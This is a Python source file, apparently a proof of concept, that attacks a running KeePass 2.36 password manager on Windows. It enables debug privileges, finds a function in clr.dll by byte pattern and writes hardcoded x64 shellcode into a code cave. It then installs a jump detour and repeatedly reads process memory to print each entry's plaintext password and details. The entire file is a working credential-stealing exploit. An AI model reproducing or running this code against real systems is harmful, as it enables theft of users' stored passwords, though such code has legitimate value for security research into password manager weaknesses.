"""invade_keepass main module.

Warning: your passwords and other sensitive data may be displayed on the screen
in plaintext.

This is a proof of concept. New instances of the KeePass process are not
sought. Only the currently running KeePass process will be targeted.
"""

import sys
import time
import string
import invade
import extract_rtf

print(f'Running invade v{invade.VERSION}')

# Instantiate Me and check the operating environment
me = invade.Me()
if not me.is_windows:
    sys.exit('Error: Windows is required')
if not me.is_windows_admin:
    print('Warning: not running as Windows admin')
if not me.is_debug_privilege_enabled:
    sys.exit('Error: unable to enable debug privileges')

target_name = 'KeePass.exe'
target_version = '2.36.0.0'
target_module_name = 'clr.dll'

# Initialize Scout
scout = invade.Scout(target_name)

if not scout.pids:
    sys.exit(f'Error: {target_name} is not running')
if len(scout.pids) > 1:
    print(f'Warning: multiple PIDs found for {target_name}')

# Initialize Target using the first PID found
target_pid = scout.pids[0]
target = invade.Target(target_pid)

# Check for compatibility
if target.is_x64 and not me.is_x64:
    print(f'Warning: {target_name} is 64-bit. Use Python 64-bit instead.')
if target.version_info['file_version_2'] != target_version:
    print(f'Warning: untested {target_name} version: '
          f'{target.version_info["file_version_2"]}')

# Initialize tool
tool = invade.Tool()

# Compute address to detour (clr.dll's MarshalNative::CopyToNative) via
# byte pattern file search.

# Get module's memory address within target process
target_module_address = tool.get_module_address(target.process_handle,
                                                target_module_name)
if not target_module_address:
    sys.exit(f'Error: unknown module base address for {target_module_name}')
if len(target_module_address) > 1:
    print(f'Warning: multiple instances of {target_module_name} found')
target_module_address = target_module_address[0]

# Get module's file path
target_module_path = tool.get_module_path(target.process_handle,
                                          target_module_name)
target_module_path = target_module_path[0]

# Make sure there's a viable destination (a code cave) for the shellcode.
# Note that Tool.memory_allocate() could have been used instead.
target_module_address_code_cave = tool.pe_get_code_cave_end_of_section(
    target_module_path)
if not target_module_address_code_cave:
    sys.exit(f'Error: no code cave in {target_module_name}')
target_module_address_code_cave = target_module_address_code_cave[0]
target_module_address_code_cave = target_module_address + \
                                  target_module_address_code_cave['start']
# The first 16 bytes of the code cave will store two pointers: one to the
# entry's info and the other to the entry's password. In 64-bit, each pointer
# can be up to 8 bytes, so 16 bytes is required. Therefore, the injected
# executable code will begin 16 bytes later.
target_module_address_code_cave += 16

# MarshalNative::CopyToNative (clr.dll function to detour) byte search pattern
# Alternatively (not implemented), we could get the address via clr.dll's EAT
target_detour_pattern = '''
4C 0F AF C9 83 C2 F8 4B 8D 04 01 48 03 D0 4C 0F AF D1 4D 8B C2 49 8B CE FF 15 
?? ?? ?? ?? C6 44 24 ?? ??
'''
target_detour_address = []
for found_address in tool.search_file_pattern(
        target_module_path,
        target_detour_pattern):
    target_detour_address.append(found_address)
if not target_detour_address:
    sys.exit(f'Error: pattern not found in {target_module_name}')

# There should only be one match for this pattern.
# The hook address is the start of the pattern + 30 bytes.
target_detour_address = target_detour_address[0] + 30

# Calculate function's address in memory
target_detour_address += target_module_address + \
                         tool.pe_get_rva_diff(target_module_path)

target_detour_address_check = \
    tool.memory_read(target.process_handle,
                     target_detour_address,
                     3,
                     True)
if not target_detour_address_check:
    sys.exit('Error: memory read failed')
if target_detour_address_check != 'C64424':
    if target_detour_address_check[:2] == 'E9':
        print(f'Warning: detour may already exist at '
              f'{hex(target_detour_address)}')
    else:
        sys.exit(f'Error: unexpected instruction found at '
                 f'{hex(target_detour_address)}')

# Convert detour written in assembly to opcodes
target_shellcode_detour = tool.get_opcodes(f'''
jmp {target_module_address_code_cave}    
''', target_detour_address)
if not target_shellcode_detour:
    sys.exit('Error: Unable to assemble instructions')

# For simplicity, the following string is used instead of Tool.get_opcodes().
# See invade_keepass_shellcode.txt for shellcode assembly instructions.
# Note: Multiline Ultimate Assembler for x64dbg often assembles with extra 90
# instructions (NOP).
target_shellcode_main = '''
C6 44 24 60 00 48 3D 00 10 00 00 7C 5E 90 90 90 90 48 83 FB 01 74 3E 90 90 90 
90 48 81 FB 00 10 00 00 7C 47 90 90 90 90 48 3B C3 74 3E 90 90 90 90 83 3B 00 
74 35 90 90 90 90 81 38 2D 00 2D 00 74 29 90 90 90 90 48 A3 64 D9 39 8A F8 7F 
00 00 EB 19 90 90 90 81 38 7B 5C 72 74 75 0E 90 90 90 90 48 A3 5C D9 39 8A F8 
7F 00 00 E9 94 A4 99 FF
'''

# Inject the shellcode prior to injecting the detour
# The restore_memory_protection argument is False because the shellcode writes
# to its own memory region (and we therefore need PAGE_EXECUTE_READWRITE).
if not tool.memory_write(
        target.process_handle,
        target_module_address_code_cave,
        target_shellcode_main,
        False):
    sys.exit('Error: memory write failed')

# Now that the shellcode has been injected, write the detour
if not tool.memory_write(
        target.process_handle,
        target_detour_address,
        target_shellcode_detour):
    sys.exit('Error: memory write failed')

# Read and print sensitive password and entry info

# Static address of entry info pointer
target_entry_address_pointer_info = target_module_address_code_cave - 16

# Static address of entry password pointer
target_entry_address_pointer_password = target_module_address_code_cave - 8

# Current address of entry info
target_entry_address_info = None

# Current address of entry password
target_entry_address_password = None

target_entry_info_size = 2048  # Should be adequate in most cases
target_entry_password_size = 1024  # Should be adequate in most cases

# Current entry info
target_entry_info = None

# Current entry password
target_entry_password = None

print(f'Pointer to entry info: '
      f'{hex(target_entry_address_pointer_info)}')
print(f'Pointer to entry password: '
      f'{hex(target_entry_address_pointer_password)}')

while target.is_active:
    try:
        target_entry_address_password = tool.memory_read_pointers(
            target.process_handle,
            f'[{hex(target_entry_address_pointer_password)}]',
            8)
        target_entry_address_info = tool.memory_read_pointers(
            target.process_handle,
            f'[{hex(target_entry_address_pointer_info)}]',
            8)
        if target_entry_address_password > 0 and target_entry_address_info > 0:
            target_entry_password = tool.memory_read(
                target.process_handle,
                target_entry_address_password,
                target_entry_password_size,
                True)
            target_entry_info = tool.memory_read(
                target.process_handle,
                target_entry_address_info,
                target_entry_info_size,
                True)
            if target_entry_password and target_entry_info:
                # Flush pointers for next read attempt
                tool.memory_write(target.process_handle,
                                  target_entry_address_pointer_password,
                                  '0000000000000000',
                                  False)
                tool.memory_write(target.process_handle,
                                  target_entry_address_pointer_info,
                                  '0000000000000000',
                                  False)
                # Entry password will be in Unicode format
                target_entry_password = tool.convert_str_hex_to_str(
                    target_entry_password, unicode=True)
                # Entry info will be in ASCII RTF format
                target_entry_info = extract_rtf.striprtf(
                    tool.convert_str_hex_to_str(target_entry_info))
                if target_entry_password and target_entry_info:
                    print('\n' + target_entry_password.rstrip(
                        string.whitespace + '\x00'))
                    print(target_entry_info.rstrip(
                        string.whitespace + '\x00'))

    except (TypeError, SystemError):
        continue

    time.sleep(0.5)
